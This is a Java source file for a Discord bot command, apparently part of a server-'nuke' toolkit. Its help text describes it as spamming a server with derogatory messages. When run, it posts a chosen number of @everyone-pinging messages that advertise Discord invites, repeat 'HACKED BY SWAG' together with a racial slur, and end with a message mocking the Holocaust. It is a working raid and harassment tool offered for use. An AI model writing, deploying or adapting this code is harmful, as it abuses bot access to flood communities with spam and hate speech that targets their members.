package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;

public class MassDM implements ICommand {
    private boolean running;
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("210956619788320768")) {
            return;
        }
        running = true;
        if (args.isEmpty())
        {
            event.getChannel().sendMessage("Please insert an amount of times you want to spam").queue();
            return;
        }
        try {
            int input = Integer.parseInt(args.get(0));
            for (int i = 0; i != input; i++) {
                if (running) {
                    event.getChannel().sendMessage("\uD83D\uDE0E\uD83D\uDE0E https://discord.gg/failures https://discord.gg/92YFdKM @everyone HACKED BY SWAG L L L NIGGA @everyone \uD83D\uDE0E\uD83D\uDE0E " +"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " +"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"\n😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  " + "😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  "+"😎😎 @everyone HACKED BY SWAG L L L NIGGA @everyone 😎😎  ").queue();
                    Thread.sleep(600);
                }
                if (i == input - 1) {
                    running = false;
                    event.getChannel().sendMessage("\uD83C\uDF89\uD83C\uDF89@everyone the holocoust v2 has been stopped \uD83D\uDE01\uD83E\uDD1E\uD83D\uDE09\uD83D\uDC4D\uD83E\uDD23").queue();
                }
            }

        } catch (NumberFormatException | InterruptedException ex) {
            event.getChannel().sendMessage("Insert an amount to spam, dummy!");
        }
    }

    @Override
    public String getHelp() {
        return "Spams the server with derogatory messages whilst mentioning everyone\n`" + Core.PREFIX + getInvoke() + " [amount]`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "dmadv";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"dmadvertise"};
    }

     @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}
